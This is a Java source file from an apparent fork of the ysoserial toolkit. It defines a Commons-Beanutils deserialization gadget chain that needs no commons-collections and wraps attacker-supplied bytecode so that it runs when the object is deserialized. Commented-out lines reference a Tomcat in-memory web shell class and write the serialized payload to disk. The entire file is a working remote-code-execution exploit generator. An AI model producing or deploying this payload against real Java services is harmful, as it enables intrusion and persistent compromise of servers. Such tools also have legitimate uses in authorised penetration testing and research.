package ysoserial.payloads;

import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.lang.RandomStringUtils;
import sun.misc.BASE64Encoder;
import ysoserial.Serializer;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.templates.SpringInterceptorTemplate;
import ysoserial.payloads.util.ClassFiles;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.File;
import java.io.FileOutputStream;
import java.util.PriorityQueue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({Authors.Y4ER})
public class CommonsBeanutils1NOCC implements ObjectPayload<Object> {

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils1NOCC.class, args);
//        String encode = BASE64Encoder.class.newInstance().encode(ClassFiles.classAsBytes(SpringInterceptorTemplate.class)).replaceAll("\n", "");
//        System.out.println(encode.replaceAll("\n", ""));
//
//        Object object = new CommonsBeanutils1NOCC().getObject("CLASS:TomcatListenerMemShellFromJMX");
//        File file = new File("c:\\users\\ddd\\desktop\\ser.ser");
//        if (file.exists()) file.delete();
//        Serializer.serialize(object, new FileOutputStream(file));
    }

    public Object getObject(final String command) throws Exception {
        final Object template = Gadgets.createTemplatesImpl(command);
        // mock method name until armed
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
//        queue.add(new BigInteger("1"));
//        queue.add(new BigInteger("1"));
        queue.add("1");
        queue.add("1");

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = template;
        queueArray[1] = template;

        return queue;
    }
}
